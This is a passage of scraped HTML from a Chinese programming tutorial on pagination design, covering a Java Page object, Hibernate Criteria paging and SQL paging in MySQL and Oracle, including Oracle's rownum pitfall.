data-offset-key="1427:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_1463499681" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1427:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1427:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1428"> <span data-slate-object="text" data-key="1429"><span data-slate-leaf="true" 
data-offset-key="1429:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1429:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7078313324" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1429:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3271252238" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1429:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2793965276" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1429:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3271252238" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1429:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_0051397886" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span 
data-slate-string="true">getPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1429:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_2069516731" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1429:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3271252238" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1429:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1430"> <span data-slate-object="text" data-key="1431"><span data-slate-leaf="true" 
data-offset-key="1431:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1431:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8183750710" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1431:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_2275968668" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1431:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9506131596" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1431:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_2275968668" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1431:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6099498928" data-annotation-type="annotation"><span 
data-slate-string="true">getTotalPages</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1431:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_2275968668" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_1678960910" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1431:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_2275968668" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1431:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1432"> <span data-slate-object="text" data-key="1433"><span data-slate-leaf="true" 
data-offset-key="1433:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1433:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_6619978545" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1433:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3269372860" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1433:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7905238334" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1433:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3269372860" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1433:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_9463395096" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span 
data-slate-string="true">getLastPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1433:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3269372860" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_4471861997" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1433:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3269372860" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1433:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1434"> <span data-slate-object="text" data-key="1435"><span data-slate-leaf="true" 
data-offset-key="1435:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1435:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7952882934" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="1435:2"><span data-slate-string="true"> Collection&lt;T&gt; 
getData() {}</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1436"> <span data-slate-object="text" data-key="1437"><span 
data-slate-leaf="true" data-offset-key="1437:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 216px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-904aac1f " data-slate-type="paragraph" data-slate-object="block" 
data-key="1438"> <span data-slate-object="text" data-key="1439"><span data-slate-leaf="true" 
data-offset-key="1439:0" data-first-offset="true"><span data-slate-string="true">你看，这个分页对象和前面的那个例子不同，它将 
DAO（数据访问对象，在 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1440" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="1441"><span data-slate-leaf="true" 
data-offset-key="1441:0" data-first-offset="true"><span data-slate-string="true">[第 12 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1442"><span data-slate-leaf="true" data-offset-key="1442:0" 
data-first-offset="true"><span data-slate-string="true"> 有介绍）的某次查询的结果，也就是某一页上的数据集合，给包装起来了。因此这个对象是由 
DAO 返回的，并且里面的数据仅仅是特定某一页的，这也是它没有提供用于翻页的方法的原因——具体要访问哪一页的数据，需要将页码和页面大小这样的信息传给 DAO 去处理。</span></span></span> 
</div> <h3 class="se-67102316" data-slate-type="heading" data-slate-object="block" data-key="1443"><span 
data-slate-object="text" data-key="1444"><span data-slate-leaf="true" data-offset-key="1444:0" 
data-first-offset="true"><span data-slate-string="true">其它方法</span></span></span></h3> <div 
class="se-d6b3bf43 " data-slate-type="paragraph" data-slate-object="block" data-key="1445"> 
<span data-slate-object="text" data-key="1446"><span data-slate-leaf="true" data-offset-key="1446:0" 
data-first-offset="true"><span data-slate-string="true">比如说，如果按照充血模型的方式来设计（关于充血模型是什么，以及代码实现的例子，你可以参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1447" class="se-e48fb8fa 
se-7e5be227"><span data-slate-object="text" data-key="1448"><span data-slate-leaf="true" data-offset-key="1448:0" 
data-first-offset="true"><span data-slate-string="true">[第 08 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1449"><span data-slate-leaf="true" data-offset-key="1449:0" 
data-first-offset="true"><span data-slate-string="true">），则可以</span></span></span><span data-slate-object="text" 
data-key="1450"><span data-slate-leaf="true" data-offset-key="1450:0" data-first-offset="true"><span 
class="se-9e87d030" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">把这个 
Page 对象和 DAO 的代码整合起来，放到同一个有状态的业务对象上面去，这样这个对象既携带了业务数据，又携带了分页信息。</span></span></span></span><span 
data-slate-object="text" data-key="1451"><span data-slate-leaf="true" data-offset-key="1451:0" 
data-first-offset="true"><span data-slate-string="true">当然，这个方法的区别其实只是贫血模型和充血模型的区别，从分页设计的角度上来看，和上面的第二种其实没有本质区别。</span></span></span> 
</div> <div class="se-5814665e " data-slate-type="paragraph" data-slate-object="block" data-key="1452"> 
<span data-slate-object="text" data-key="1453"><span data-slate-leaf="true" data-offset-key="1453:0" 
data-first-offset="true"><span data-slate-string="true">此外，一些“管得宽”的持久层 ORM 框架，往往也把分页的事情给包装了，给开发人员开放易于使用的分页接口。比方说 
Hibernate，你看这样一个例子：</span></span></span> </div> <div class="se-f801ad21 se-8d5c71fc" data-slate-type="pre" 
data-slate-object="block" data-key="1454" data-code-language="cpp"> <div class="se-a041aa56 
se-bea68a78"> <span></span> </div> <div class="se-ab9390f9"> <div class="se-c2b01b4c se-1a7380ac" 
data-code-line-number="1"></div> <div class="se-c2b01b4c se-1a7380ac" data-code-line-number="2"></div> 
<div class="se-c2b01b4c se-1a7380ac" data-code-line-number="3"></div> <div class="se-c2b01b4c 
se-1a7380ac" data-code-line-number="4"></div> <div class="se-c2b01b4c se-1a7380ac" data-code-line-number="5"></div> 
</div> <div class="se-38c5d79a ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1455"> <span data-slate-object="text" data-key="1456"><span 
data-slate-leaf="true" data-offset-key="1456:0" data-first-offset="true"><span data-slate-string="true">session 
</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1457"> <span data-slate-object="text" data-key="1458"><span 
data-slate-leaf="true" data-offset-key="1458:0" data-first-offset="true"><span data-slate-string="true">.createCriteria(Example.class)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1459"> <span data-slate-object="text" data-key="1460"><span data-slate-leaf="true" 
data-offset-key="1460:0" data-first-offset="true"><span data-slate-string="true">.setFirstResult(</span></span><span 
data-slate-leaf="true" data-offset-key="1460:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7048516071" data-annotation-type="annotation"><span data-slate-string="true">10</span></span></span><span 
data-slate-leaf="true" data-offset-key="1460:2"><span data-slate-string="true">)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1461"> <span data-slate-object="text" data-key="1462"><span data-slate-leaf="true" 
data-offset-key="1462:0" data-first-offset="true"><span data-slate-string="true">.setMaxResults(</span></span><span 
data-slate-leaf="true" data-offset-key="1462:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1333175970" data-annotation-type="annotation"><span data-slate-string="true">5</span></span></span><span 
data-slate-leaf="true" data-offset-key="1462:2"><span data-slate-string="true">)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1463"> <span data-slate-object="text" data-key="1464"><span data-slate-leaf="true" 
data-offset-key="1464:0" data-first-offset="true"><span data-slate-string="true">.</span></span><span 
data-slate-leaf="true" data-offset-key="1464:1"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_4262300711" data-annotation-type="annotation"><span data-slate-string="true">list</span></span></span><span 
data-slate-leaf="true" data-offset-key="1464:2"><span data-slate-string="true">();</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-dcfaeb15 " data-slate-type="paragraph" data-slate-object="block" data-key="1465"> 
<span data-slate-object="text" data-key="1466"><span data-slate-leaf="true" data-offset-key="1466:0" 
data-first-offset="true"><span data-slate-string="true">这就是通过 Hibernate 的 Criteria Query API 
来实现的，代码也很易于理解。当然，如果想要取得总行数，那可以用 Projection：</span></span></span> </div> <div class="se-dafe0956 
se-7e0b479f" data-slate-type="pre" data-slate-object="block" data-key="1467" data-code-language="cpp"> 
<div class="se-789962b7 se-c6a72391"> <span></span> </div> <div class="se-f33b7799"> <div class="se-cced09fe 
se-479bbf21" data-code-line-number="1"></div> <div class="se-cced09fe se-479bbf21" data-code-line-number="2"></div> 
<div class="se-cced09fe se-479bbf21" data-code-line-number="3"></div> <div class="se-cced09fe 
se-479bbf21" data-code-line-number="4"></div> <div class="se-cced09fe se-479bbf21" data-code-line-number="5"></div> 
</div> <div class="se-72206612 ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1468"> <span data-slate-object="text" data-key="1469"><span 
data-slate-leaf="true" data-offset-key="1469:0" data-first-offset="true"><span data-slate-string="true">session</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1470"> <span data-slate-object="text" data-key="1471"><span data-slate-leaf="true" 
data-offset-key="1471:0" data-first-offset="true"><span data-slate-string="true">.createCriteria(Example.class)</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1472"> <span data-slate-object="text" data-key="1473"><span data-slate-leaf="true" 
data-offset-key="1473:0" data-first-offset="true"><span data-slate-string="true">.setProjection(Projections.rowCount())</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1474"> <span data-slate-object="text" data-key="1475"><span data-slate-leaf="true" 
data-offset-key="1475:0" data-first-offset="true"><span data-slate-string="true">.</span></span><span 
data-slate-leaf="true" data-offset-key="1475:1"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_0272131860" data-annotation-type="annotation"><span data-slate-string="true">list</span></span></span><span 
data-slate-leaf="true" data-offset-key="1475:2"><span data-slate-string="true">()</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1476"> <span data-slate-object="text" data-key="1477"><span data-slate-leaf="true" 
data-offset-key="1477:0" data-first-offset="true"><span data-slate-string="true">.get(</span></span><span 
data-slate-leaf="true" data-offset-key="1477:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7571535938" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1477:2"><span data-slate-string="true">);</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <h2 class="se-29f338e4" data-slate-type="heading" data-slate-object="block" data-key="1478"><span 
data-slate-object="text" data-key="1479"><span data-slate-leaf="true" data-offset-key="1479:0" 
data-first-offset="true"><span data-slate-string="true">SQL 实现</span></span></span></h2> <div 
class="se-7875f037 " data-slate-type="paragraph" data-slate-object="block" data-key="1480"> 
<span data-slate-object="text" data-key="1481"><span data-slate-leaf="true" data-offset-key="1481:0" 
data-first-offset="true"><span data-slate-string="true">如果使用关系数据库，那么落实到 SQL 上，以 MySQL 为例，大致是这样的：</span></span></span> 
</div> <div class="se-c95ba062 se-87e3972a" data-slate-type="pre" data-slate-object="block" 
data-key="1482" data-code-language="sql"> <div class="se-f15e0bf8 se-ceba18a3"> <span></span> 
</div> <div class="se-5e73107a"> <div class="se-21eadc57 se-04d18e84" data-code-line-number="1"></div> 
</div> <div class="se-977731a1 ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1483"> <span data-slate-object="text" data-key="1484"><span 
data-slate-leaf="true" data-offset-key="1484:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5334940515" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1484:1"><span 
data-slate-string="true"> * </span></span><span data-slate-leaf="true" data-offset-key="1484:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_9158610417" 
data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1484:3"><span data-slate-string="true"> TABLE_NAME 
</span></span><span data-slate-leaf="true" data-offset-key="1484:4"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4087266762" data-annotation-type="annotation"><span 
data-slate-string="true">limit</span></span></span><span data-slate-leaf="true" data-offset-key="1484:5"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1484:6"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_6915807412" 
data-annotation-type="annotation"><span data-slate-string="true">3</span></span></span><span 
data-slate-leaf="true" data-offset-key="1484:7"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1484:8"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6568235324" data-annotation-type="annotation"><span data-slate-string="true">4</span></span></span><span 
data-slate-leaf="true" data-offset-key="1484:9"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-9acdee37 " data-slate-type="paragraph" data-slate-object="block" data-key="1485"> 
<span data-slate-object="text" data-key="1486"><span data-slate-leaf="true" data-offset-key="1486:0" 
data-first-offset="true"><span data-slate-string="true">limit 后面有两个参数，第一个表示从下标为 3 的行开始返回，第二个表示一共最多返回 
4 行数据。</span></span></span> </div> <div class="se-1b7c5397 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1487"> <span data-slate-object="text" data-key="1488"><span data-slate-leaf="true" 
data-offset-key="1488:0" data-first-offset="true"><span data-slate-string="true">但是，如果使用的是 
Oracle 数据库，很多朋友都知道可以使用行号 rownum，可是这里面有一个小坑——Oracle 给 rownum 赋值发生在当条子句的主干执行完毕后，比如说：</span></span></span> 
</div> <div class="se-a418d89f se-60b5c308" data-slate-type="pre" data-slate-object="block" 
data-key="1489" data-code-language="sql"> <div class="se-0c732125 se-1cdc380d"> <span></span> 
</div> <div class="se-cf6127dc"> <div class="se-79593424 se-2c6cbe1c" data-code-line-number="1"></div> 
</div> <div class="se-11852e8c ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1490"> <span data-slate-object="text" data-key="1491"><span 
data-slate-leaf="true" data-offset-key="1491:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_3967768581" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1491:1"><span 
data-slate-string="true"> * </span></span><span data-slate-leaf="true" data-offset-key="1491:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5072807923" 
data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:3"><span data-slate-string="true"> TABLE_NAME 
</span></span><span data-slate-leaf="true" data-offset-key="1491:4"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0409679511" data-annotation-type="annotation"><span 
data-slate-string="true">where</span></span></span><span data-slate-leaf="true" data-offset-key="1491:5"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1491:6"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7644686440" 
data-annotation-type="annotation"><span data-slate-string="true">rownum</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3089656330" data-annotation-type="annotation"><span data-slate-string="true">between</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:10"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6524441078" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6380864003" data-annotation-type="annotation"><span data-slate-string="true">and</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1491:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2293175159" data-annotation-type="annotation"><span data-slate-string="true">4</span></span></span><span 
data-slate-leaf="true" data-offset-key="1491:15"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 316px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-5ac35003 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1492"> <span data-slate-object="text" data-key="1493"><span data-slate-leaf="true" 
data-offset-key="1493:0" data-first-offset="true"><span data-slate-string="true">如果表里面有 100 
行数据，那么你觉得上面那条 SQL 会返回什么？</span></span></span> </div> <div class="se-9083d066 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1494"> <span data-slate-object="text" data-key="1495"><span 
data-slate-leaf="true" data-offset-key="1495:0" data-first-offset="true"><span data-slate-string="true">返回 
2 行到第 4 行的数据吗？不对，它什么都不会返回。</span></span></span> </div> <div class="se-1c0ad431 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1496"> <span data-slate-object="text" data-key="1497"><span 
data-slate-leaf="true" data-offset-key="1497:0" data-first-offset="true"><span data-slate-string="true">这是为什么呢？因为对每一行数据，执行完毕以后才判断它的 
rownum，于是：</span></span></span> </div> <div class="se-0b22eef1" data-slate-type="list" data-slate-object="block" 
data-key="1498"> <div class="se-752cc80d se-0aaceb00" data-slate-type="list-line" data-slate-object="block" 
data-key="1499"> <span data-slate-object="text" data-key="1500"><span data-slate-leaf="true" 
data-offset-key="1500:0" data-first-offset="true"><span data-slate-string="true">第一行执行后的 rownum 
就是 1，而因为不符合“2 到 4”的条件，因此该行遍历后，就从结果集中抛弃了；</span></span></span> </div> <div class="se-e2fc76f7 
se-d63f9830" data-slate-type="list-line" data-slate-object="block" data-key="1501"> <span data-slate-object="text" 
data-key="1502"><span data-slate-leaf="true" data-offset-key="1502:0" data-first-offset="true"><span 
data-slate-string="true">于是执行第二行，由于前面那行被抛弃了，那这一行是新的一行，因此它的 rownum 还是 1，显然还是不符合条件，抛弃；</span></span></span> 
</div> <div class="se-2c3ed8f1 se-12ffad85" data-slate-type="list-line" data-slate-object="block" 
data-key="1503"> <span data-slate-object="text" data-key="1504"><span data-slate-leaf="true" 
data-offset-key="1504:0" data-first-offset="true"><span data-slate-string="true">每一行都这样操作，结果就是，所有行都被抛弃，因此什么数据都没有返回。</span></span></span> 
</div> </div> <div class="se-a0dc0f20 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1505"> <span data-slate-object="text" data-key="1506"><span data-slate-leaf="true" 
data-offset-key="1506:0" data-first-offset="true"><span data-slate-string="true">解决方法也不难，用一个嵌套就好，让里面那层返回从第 
1 条到第 4 条数据，并给 rownum 赋一个新的变量名 r，外面那层再过滤，取得 r 大于等于 3 的数据：</span></span></span> </div> <div 
class="se-fac4ce91 se-28d3b003" data-slate-type="pre" data-slate-object="block" data-key="1507" 
data-code-language="sql"> <div class="se-8a120a9d se-385ef156"> <span></span> </div> <div class="se-6e143da0"> 
<div class="se-ff32ce09 se-2f98b119" data-code-line-number="1"></div> </div> <div class="se-d44da55d 
ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1508"> <span data-slate-object="text" data-key="1509"><span data-slate-leaf="true" 
data-offset-key="1509:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0606525585" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:1"><span data-slate-string="true"> * </span></span><span 
data-slate-leaf="true" data-offset-key="1509:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6567250252" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:3"><span data-slate-string="true"> (</span></span><span 
data-slate-leaf="true" data-offset-key="1509:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7872842944" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:5"><span data-slate-string="true"> e.*, </span></span><span 
data-slate-leaf="true" data-offset-key="1509:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1232534677" data-annotation-type="annotation"><span data-slate-string="true">rownum</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:7"><span data-slate-string="true"> r </span></span><span 
data-slate-leaf="true" data-offset-key="1509:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9510946441" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:9"><span data-slate-string="true"> TABLE_NAME 
e </span></span><span data-slate-leaf="true" data-offset-key="1509:10"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1236978516" data-annotation-type="annotation"><span 
data-slate-string="true">where</span></span></span><span data-slate-leaf="true" data-offset-key="1509:11"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1509:12"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0203227898" 
data-annotation-type="annotation"><span data-slate-string="true">rownum</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:13"><span data-slate-string="true">&lt;=</span></span><span 
data-slate-leaf="true" data-offset-key="1509:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_0568469581" data-annotation-type="annotation"><span data-slate-string="true">4</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:15"><span data-slate-string="true">) </span></span><span 
data-slate-leaf="true" data-offset-key="1509:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7838307895" data-annotation-type="annotation"><span data-slate-string="true">where</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:17"><span data-slate-string="true"> r&gt;=</span></span><span 
data-slate-leaf="true" data-offset-key="1509:18"><span class=" gkhl-number" data-slate-object="annotation" 
